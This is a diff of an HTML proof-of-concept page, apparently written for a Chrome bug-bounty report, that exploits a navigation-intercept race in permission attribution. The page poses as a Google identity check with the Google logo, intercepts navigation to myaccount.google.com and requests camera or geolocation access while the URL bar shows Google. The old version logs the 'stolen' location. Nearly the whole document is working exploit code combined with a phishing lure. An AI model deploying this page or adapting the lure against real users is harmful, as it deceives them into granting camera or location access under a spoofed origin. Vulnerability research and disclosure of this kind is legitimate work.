@@ -1,63 +1,88 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>VRP Research: Permission Attribution</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chrome VRP: Permission Attribution Bypass</title>
     <style>
-        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; }
-        .box { border: 1px solid #dadce0; padding: 20px; border-radius: 8px; max-width: 350px; margin: 0 auto; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 16px; width: 100%; cursor: pointer; }
+        body { font-family: -apple-system, system-ui, sans-serif; text-align: center; padding: 40px 20px; background: #fff; }
+        .box { border: 1px solid #dadce0; padding: 30px; border-radius: 12px; max-width: 400px; margin: 0 auto; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+        .btn { background: #1a73e8; color: white; border: none; padding: 18px 30px; border-radius: 6px; font-size: 16px; width: 100%; cursor: pointer; font-weight: 500; }
+        #status { margin-top: 25px; font-size: 14px; font-family: monospace; padding: 10px; border-radius: 4px; }
+        .loading { color: #5f6368; }
+        .success { color: #1e8e3e; background: #e6f4ea; }
+        .error { color: #d93025; background: #fce8e6; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
-        <h3>Security Check</h3>
-        <p>Google needs to verify your device location to secure this session.</p>
-        <button class="btn" onclick="startAttributionRace()">Secure Session</button>
-    </div>
-    <div id="status" style="margin-top:20px; font-weight:bold;"></div>
+<div class="box">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90" alt="Google">
+    <h2>Security Verification</h2>
+    <p>Google needs to verify your identity using a quick face-match check.</p>
+    <button class="btn" id="startBtn">Verify Identity</button>
+</div>
 
-    <script>
-        function startAttributionRace() {
-            const target = "https://myaccount.google.com/?pli=1";
-            const status = document.getElementById('status');
+<div id="status">Status: Waiting for interaction...</div>
 
-            // 1. Set up the Navigation Intercept
-            navigation.addEventListener('navigate', (event) => {
-                if (event.destination.url.includes("google.com")) {
-                    event.intercept({
-                        handler: async () => {
-                            status.innerText = "URL COMMITTED. REQUESTING PERMISSION...";
-                            status.style.color = "orange";
+<script>
+    const status = document.getElementById('status');
+    const startBtn = document.getElementById('startBtn');
 
-                            // 2. THE GAP: Wait for the URL bar to finish updating
-                            await new Promise(r => setTimeout(r, 800));
+    // 1. Navigation API Support Check
+    if (!window.navigation) {
+        status.innerText = "Error: Navigation API not found. Please use Chrome 102+ on Android.";
+        status.className = "error";
+    }
 
-                            // 3. THE EXPLOIT: Request location while the URL bar says 'google.com'
-                            navigator.geolocation.getCurrentPosition(
-                                (pos) => {
-                                    status.innerText = "SUCCESS: Permission Granted to " + location.origin;
-                                    status.style.color = "green";
-                                    console.log("Stolen Location:", pos);
-                                },
-                                (err) => {
-                                    status.innerText = "DENIED: " + err.message;
-                                    status.style.color = "red";
-                                }
-                            );
+    async function triggerExploit() {
+        // High-value target: The Google Account page
+        const target = "https://myaccount.google.com/?pli=1";
+        
+        status.innerText = "Initiating transition...";
+        status.className = "loading";
 
-                            // Keep the renderer stalled so the user sees the 'Google' prompt
-                            await new Promise(r => setTimeout(r, 10000));
+        // 2. Add the 'navigate' listener to intercept the jump
+        navigation.addEventListener('navigate', (event) => {
+            if (event.destination.url.includes("google.com")) {
+                event.intercept({
+                    handler: async () => {
+                        // 3. The Race Window
+                        // The URL bar has likely committed to Google by now.
+                        // We wait for the browser UI to settle (approx 1 second)
+                        status.innerText = "URL COMMITTED. ATTRIBUTING PERMISSION...";
+                        
+                        await new Promise(r => setTimeout(r, 1200));
+
+                        // 4. Trigger the permission prompt
+                        // We use Camera (getUserMedia) because it's higher reward
+                        try {
+                            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                            
+                            status.innerText = "VULNERABILITY CONFIRMED: Permission granted under fake origin.";
+                            status.className = "success";
+                            
+                            // Stop the camera once we confirm the bypass
+                            stream.getTracks().forEach(track => track.stop());
+                        } catch (err) {
+                            status.innerText = "Permission Result: " + err.name;
+                            status.className = "error";
                         }
-                    });
-                }
-            }, { once: true });
 
-            // 4. Trigger the transition
-            window.location.href = target;
-        }
-    </script>
+                        // Keep the renderer stalled for 5 seconds to allow for recording/screenshots
+                        await new Promise(r => setTimeout(r, 5000));
+                        location.reload();
+                    }
+                });
+            }
+        }, { once: true });
+
+        // 5. Start the navigation
+        window.location.href = target;
+    }
+
+    startBtn.addEventListener('click', triggerExploit);
+</script>
+
 </body>
 </html>
